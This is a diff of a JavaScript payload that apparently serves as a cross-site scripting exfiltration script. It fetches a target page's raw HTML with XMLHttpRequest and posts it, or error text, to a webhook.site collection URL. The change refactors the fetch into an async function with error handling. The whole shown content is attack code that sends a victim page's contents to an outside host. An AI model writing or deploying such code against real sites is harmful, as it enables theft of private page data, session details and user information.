@@ -3,27 +3,35 @@ const TARGET_URL = "http://localhost/index.php";  // URL of the page you want to
 const WEBHOOK_URL = "https://webhook.site/998b21e9-1fed-4da1-9818-67cfafdbfaae/";  // Replace with your webhook URL
 
 // Create a new XMLHttpRequest object for fetching the page content
-const xhrFetch = new XMLHttpRequest();
-xhrFetch.open("GET", TARGET_URL, true);
+async function fetchAndSendContent() {
+  try {
+    const xhrFetch = new XMLHttpRequest();
+    xhrFetch.open("GET", TARGET_URL, true);
+    
+    // Onload event for the fetch request
+    xhrFetch.onload = function() {
+      if (xhrFetch.status === 200) {
+        // Get the content of the page (raw HTML)
+        const pageContent = xhrFetch.responseText;
+    
+        // Check if the page content is empty or invalid
+        if (!pageContent.trim()) {
+          sendFallbackMessage("No content found on the target page.");
+        } else {
+          // Send the actual page content to the webhook
+          sendToWebhook(pageContent);
+        }
+      } else {
+        // Handle HTTP error (e.g., 404 or 500)
+        sendFallbackMessage(`Failed to fetch page: HTTP ${xhrFetch.status}`);
+      }
+    };
 
-// Onload event for the fetch request
-xhrFetch.onload = function() {
-  if (xhrFetch.status === 200) {
-    // Get the content of the page (raw HTML)
-    const pageContent = xhrFetch.responseText;
-
-    // Check if the page content is empty or invalid
-    if (!pageContent.trim()) {
-      sendFallbackMessage("No content found on the target page.");
-    } else {
-      // Send the actual page content to the webhook
-      sendToWebhook(pageContent);
-    }
-  } else {
-    // Handle HTTP error (e.g., 404 or 500)
-    sendFallbackMessage(`Failed to fetch page: HTTP ${xhrFetch.status}`);
+  } catch (error) {
+    // In case of any error, send a fallback message
+    sendToWebhook(`Error: ${error.message}`);
   }
-};
+}
 
 // Function to send content to the webhook
 function sendToWebhook(content) {
